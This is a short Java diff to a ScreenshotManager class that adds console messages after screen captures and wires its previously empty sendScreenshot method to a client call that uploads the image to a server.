@@ -1,5 +1,7 @@
 package screenshots;
 
+import transmission.Client;
+
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
@@ -15,13 +17,16 @@ public class ScreenshotManager {
 
 	public void captureFullScreen() throws Exception{
 		screenshoter.takeFullScreen(path);
+		System.out.println("Window captured");
 	}
 
 	public void captureActiveWindow() throws Exception {
 		screenshoter.takeActiveWindow(path);
+		System.out.println("Window captured");
 	}
 
 	public void sendScreenshot() {
-
+		System.out.println("Screenshot sent");
+		Client.sendImageToServer(path);
 	}
 }
